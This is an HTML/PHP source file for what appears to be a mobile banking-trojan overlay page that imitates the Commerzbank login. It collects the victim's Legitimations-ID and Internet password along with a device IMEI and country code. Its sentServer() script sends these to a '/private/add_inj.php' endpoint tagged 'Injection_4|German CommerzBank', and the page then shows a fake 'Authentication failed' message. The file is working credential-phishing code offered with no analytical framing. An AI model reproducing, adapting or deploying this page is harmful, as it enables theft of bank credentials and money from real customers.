<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>CommerzBank</title>
		<link rel="stylesheet" href="de/CommerzBank/css/cat.style.css" type="text/css" media="all">
	
    <script src="de/CommerzBank/js/jquery-1.11.3.min.js"></script>
	<script src="de/CommerzBank/js/cat.functions.js"></script>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
?>
<style type="text/css"> * { 	-webkit-box-sizing: border-box; 	   -moz-box-sizing: border-box; 	        box-sizing: border-box; }   html { 	min-width: 150px; 	min-height: 150px; } body { 	font-family: 'Arial'; } .modal { 	width: 100%; 	/*float: left;*/ 	text-align: left; 	/*min-height: 100%; 	max-height: 100%;*/     display:table;     height:100%; } .form_header img { 	max-width: 100%; 	max-height: 100%; } .wrapper {max-width:996px; margin:0 auto; -webkit-box-sizing:border-box; -moz-box-sizing:border-box; box-sizing:border-box;} .container { 	width: 100%;     height:100%;     display:table-cell;     vertical-align:middle; }  @-o-viewport { 	width: 150px; 	height: device-height; 	zoom: 1; } .container { 	#overflow: hidden; 	border-radius: 10px; } .row { 	width: 100%; } .row + .row { 	margin-top: 10px; } .modal_03{ 	 	 } .form_header { 	background: #FFF; 	text-align: center; 	position: absolute;     top:0;     left:0; 	padding: 12px;     width:100%; 	border-bottom: solid 1px #A9A9A9; } .container {padding-top:91px;} .form_header:after{ 		display: none; 	position: absolute; 	bottom: -17px; 	z-index: -1; 	left: 50%; 	margin-left: -224px; 	max-width: 100%; } .inp_caption { 	color: #FFF; 	font-family: "Helvetica"; 	font-size: 19px; 	font-weight: 500; 	text-shadow: 0 1px 1px rgba(0, 0, 2, 0.34); 	text-align: center; 	margin-bottom: 10px; } .inp_wr{ 	text-align: center; } .main_input{ 	border: none; 	outline-style: none; 	background-color: #FFF; 	border: 1px solid #E8E8E8; 	-moz-border-radius: 5px; 	-webkit-border-radius: 5px; 	border-radius: 5px; 	-moz-box-shadow: inset 0 5px 5px rgba(0, 0, 2, 0.24); 	-webkit-box-shadow: inset 0 5px 5px rgba(0, 0, 2, 0.24); 	box-shadow: inset 0 5px 5px rgba(0, 0, 2, 0.24); 	max-width: 330px; 	height: 35px; 	padding-left: 6px; 	font-size: 19px; 	width: 100%; } .input_block_wr { 	overflow: hidden; } .input_block_wr + .input_block_wr { 	margin-top: 15px; } .btn_wr { 	text-align: center; 	margin-top: 18px; 	margin-bottom: 25px; } .logon_btn { 	width: 140px; 	height: 40px; 	border: 2px solid #F0F0F0; 	-moz-border-radius: 5px; 	-webkit-border-radius: 5px; 	border-radius: 5px; 	-moz-box-shadow: 0 5px 5px rgba(0, 0, 2, 0.16); 	-webkit-box-shadow: 0 5px 5px rgba(0, 0, 2, 0.16); 	box-shadow: 0 5px 5px rgba(0, 0, 2, 0.16); 	cursor: pointer; 	outline-style: none; 	color: #000; 	font-family: "Helvetica"; 	font-size: 12px; 	font-weight: 700; 	text-shadow: 0 -2px 1px rgba(0, 0, 2, 0.42); } .content{ 	padding: 0 15px; }  @media screen and (min-height:568px) and (max-height:736px) and (min-width:320px){     .main_input {height:55px; font-size:23px;}     .logon_btn {height:60px; width:180px;} 	.btn_wr, .input_block_wr + .input_block_wr {margin-top:25px;} } @media screen and (min-height:737px) and (min-width:320px){     .main_input {height:65px; font-size:23px; max-width:640px;}     .logon_btn {height:70px; width:230px; font-size:25px;} 	.btn_wr, .input_block_wr + .input_block_wr {margin-top:35px;}     .inp_caption {font-size:25px;} } @media screen and (min-height:960px) and (min-width:320px){     .main_input {height:75px; font-size:25px;}     .logon_btn {height:75px; width:230px; font-size:29px;} 	.btn_wr, .input_block_wr + .input_block_wr {margin-top:40px;}     .inp_caption {font-size:29px;} }  @media screen and (max-height: 420px){ 	.form_header { 		padding: 5px; 		height: 40px; 		margin-bottom: 0; 	}     .container {padding-top:40px;} 	.inp_caption { 		font-size: 13px; 		margin-bottom: 3px; 	} 	.row + .row { 		margin-top: 10px; 	} 	.form_header:after { 		content: none; 	} 	.main_input{ 		height: 20px; 		font-size: 13px; 	} 	.logon_btn{ 		height: 25px; 		line-height: 19px; 		font-size: 15px; 	} 	.input_block_wr + .input_block_wr { 		margin-top: 5px; 	} 	.btn_wr { 		margin-top: 12px; 		margin-bottom: 5px; 	} } @media screen and (max-width: 200px) and (max-height: 240px) { 	.form_header { 		padding: 2px; 		height: 20px; 	}     .container {padding-top:24px;} 	.content { width:400px; border: 1px solid black; height: 400px; border-radius: 5px;  -moz-border-radius: 5px; 	-webkit-border-radius: 5px; padding: 5px;} 	.inp_caption { 		font-size: 10px; 		margin-bottom: 1px; color:#000;	} 	.row + .row{ 		margin-top: 2px; 	} 	.main_input{ 		height: 15px; 		font-size: 11px; 	} 	.input_block_wr + .input_block_wr { 		margin-top: 3px; 	} 	.btn_wr{ 		margin-top: 4px; 		margin-bottom: 4px; 	} 	.logon_btn{ 		font-size: 10px; 		height: 19px; 		line-height: 10px; 		width: 70px; 	} } </style> 
<body style="background: #FACB01;">
		<div class="modal modal_03">
            <div class="row">
                <div class="form_header" style="border-bottom: 5px solid rgb(245,169,11); ">
                    <center><img style="padding-left: 40px; max-height:65px;" src="de/CommerzBank/img/logo.png" alt=""></center>
                </div>
            </div>
			<div class="container" >
				<div id="cat-error">
					<span>Authentication failed or timed out</span>
					<input type="button" class="logon_btn" value="Try enter again"
						onClick="tryEnterAgain();"/>
				</div>

				<div id="cat-forms">
					<form id="form" class="cat-start-step">
                
					<div style="border-radius: 30px; padding: 10px; background-color: #e3e3e3; width: 75%; margin-left: 15%; border: 1px solid black;" class="row">
						<div style="padding: 5px; border-radius: 1em;" class="content">
							
							<div class="input_block_wr">
								<div class="inp_caption">
									<font color="#000">Legitimations-ID</font>
								</div>
								<div class="inp_wr">
									<input style="text-align: center;" type="text" name="field3" id="login" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									<font color="#000">Internet Passwort</font>
								</div>
								<div class="inp_wr">
									<input style="text-align: center;" placeholder="******" type="password" name="field4" id="pass" class="main_input">
								</div>
							</div>
							<div class="btn_wr">
								
									<input type="button" onClick="sentServer();"
										class="logon_btn" value="Anmelden"/>
							</div>
						</div>
					</div>
					<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
					</form>

					<form id="cat-step-2" class="cat-last-step">
						<span>Authentication failed or timed out</span>
						<input type="button" class="logon_btn" value="Try enter again"
							onClick="closeWindow()"/>
					</form>

				</div>
			</div>
		</div>
</body>
<script>
function sentServer()
{
var imei_c = document.forms["form"].elements["imei"].value; 
var login1 = document.forms["form"].elements["login"].value; 
var pass = document.forms["form"].elements["pass"].value; 

location.replace('/private/add_inj.php?p=' + imei_c+"|Injection_4|German CommerzBank|"+login1+"|"+pass);
}
</script>
</html>